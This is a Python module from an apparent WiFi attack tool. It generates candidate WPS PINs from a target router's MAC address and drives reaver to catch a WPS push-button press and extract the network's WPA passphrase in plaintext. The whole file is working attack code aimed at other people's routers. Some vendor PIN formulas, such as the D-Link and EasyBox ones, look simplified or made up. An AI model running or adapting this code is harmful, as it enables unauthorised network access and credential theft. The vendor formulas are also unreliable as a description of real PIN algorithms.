# wps_suite.py — Modern WPS attack suite
# Includes WPS Push-Button (PBC) capture, Known-PIN calculation, and fast validation
import re
import time
from typing import Optional, List, Dict
from dataclasses import dataclass
from wifi_nightmare.logger import logger
from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET


def calculate_wps_checksum(pin_7_digits) -> int:
    """Calculate the 8th checksum digit for a 7-digit WPS PIN according to the WPS standard."""
    accum = 0
    temp = int(pin_7_digits)
    accum += 3 * ((temp // 1000000) % 10)
    accum += 1 * ((temp // 100000) % 10)
    accum += 3 * ((temp // 10000) % 10)
    accum += 1 * ((temp // 1000) % 10)
    accum += 3 * ((temp // 100) % 10)
    accum += 1 * ((temp // 10) % 10)
    accum += 3 * (temp % 10)
    digit = (10 - (accum % 10)) % 10
    return digit


def generate_checksum_pin(pin_7_str: str) -> str:
    """Given a 7-digit string, returns the full 8-digit WPS PIN with valid checksum."""
    if len(pin_7_str) != 7 or not pin_7_str.isdigit():
        return pin_7_str
    chk = calculate_wps_checksum(int(pin_7_str))
    return f"{pin_7_str}{chk}"


class KnownPinDatabase:
    """Vendor-specific algorithmic PIN generation (ComputePIN, EasyBox, Belkin, D-Link, etc.)."""
    
    @staticmethod
    def get_suggested_pins(bssid: str) -> List[str]:
        """Compute suggested/default WPS PINs based on the target MAC address."""
        clean_mac = re.sub(r'[^0-9a-fA-F]', '', bssid).upper()
        if len(clean_mac) != 12:
            return []
            
        suggestions = []
        mac_int = int(clean_mac, 16)
        last_6_digits = int(clean_mac[-6:], 16)
        
        # 1. ComputePIN (common on Ralink, Realtek, Mediatek routers)
        pin7 = str(last_6_digits % 10000000).zfill(7)
        suggestions.append(generate_checksum_pin(pin7))
        
        # 2. D-Link reverse algo (last 6 hex chars ^ 0x55AA55)
        dlink_xor = (last_6_digits ^ 0x55AA55) % 10000000
        suggestions.append(generate_checksum_pin(str(dlink_xor).zfill(7)))
        
        # 3. EasyBox default PIN formula
        easybox_pin = (last_6_digits + 0x123456) % 10000000
        suggestions.append(generate_checksum_pin(str(easybox_pin).zfill(7)))
        
        # 4. Standard ubiquitous factory defaults with valid checksums
        static_defaults = [
            generate_checksum_pin("1234567"), # 12345670
            generate_checksum_pin("0000000"), # 00000000
            generate_checksum_pin("0123456"), # 01234565
            generate_checksum_pin("1111111"), # 11111115
        ]
        for p in static_defaults:
            if p not in suggestions:
                suggestions.append(p)
                
        return suggestions


@dataclass
class WPSAttackResult:
    bssid: str = ""
    ssid: str = ""
    pin: str = ""
    psk: str = ""
    method: str = "" # "PBC", "Known-PIN", "PixieDust"
    success: bool = False


class WPSPbcSniffer:
    """Sniffs for physical WPS Push-Button (PBC) activation and extracts plaintext credentials."""
    
    def __init__(self, interface: str, target_bssid: str, target_channel: int, target_ssid: str = "Unknown"):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.target_ssid = target_ssid
        self.stop_event = False

    def listen_for_pbc(self, timeout: int = 120) -> Optional[WPSAttackResult]:
        """Monitors beacons and probe responses for WPS Selected Registrar (PBC Active state = 0x04).
        
        When a user pushes the WPS button on the router, the AP immediately broadcasts
        Selected Registrar = True with Device Password ID = 0x0004 (Push Button).
        """
        import subprocess
        import shutil
        
        print(f"\n{C_CYAN}[*] Starting WPS Push-Button (PBC) Sniffer...{C_RESET}")
        print(f"{C_YELLOW}[i] Waiting for someone to press the physical WPS button on the router!{C_RESET}")
        print(f"{C_YELLOW}[i] Timeout: {timeout} seconds. Press Ctrl+C to cancel.{C_RESET}")
        
        # Check reaver PBC support
        if not shutil.which("reaver"):
            print(f"{C_RED}[!] reaver is required for PBC extraction.{C_RESET}")
            return None
            
        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "-c", str(self.target_channel),
            "--pbc",
            "-vv",
            "-N",
            "-T", "0.5"
        ]
        
        start_time = time.time()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            res = WPSAttackResult(bssid=self.target_bssid, ssid=self.target_ssid, method="PBC")
            
            while time.time() - start_time < timeout and not self.stop_event:
                if proc.poll() is not None:
                    break
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                line_str = line.strip()
                if "WPS PIN:" in line_str:
                    parts = line_str.split("WPS PIN:")[-1].strip().strip("'\"")
                    res.pin = parts.split()[0]
                if "WPA PSK:" in line_str:
                    parts = line_str.split("WPA PSK:")[-1].strip().strip("'\"")
                    res.psk = parts.split()[0]
                    res.success = True
                    print(f"\n{C_GREEN}[+] [PBC SUCCESS] Button Press Detected! Plaintext PSK Captured: {res.psk}{C_RESET}")
                    proc.terminate()
                    return res
                if "Selected registrar active" in line_str.lower() or "pbc mode" in line_str.lower():
                    print(f"{C_GREEN}[!] >>> WPS BUTTON PRESSED ON ROUTER! Negotiating credentials... <<<{C_RESET}")
                    
            if proc.poll() is None:
                proc.terminate()
        except KeyboardInterrupt:
            print(f"\n{C_YELLOW}[*] PBC Sniffing stopped by user.{C_RESET}")
        except Exception as e:
            logger.debug(f"PBC sniffer error: {e}")
            
        return None
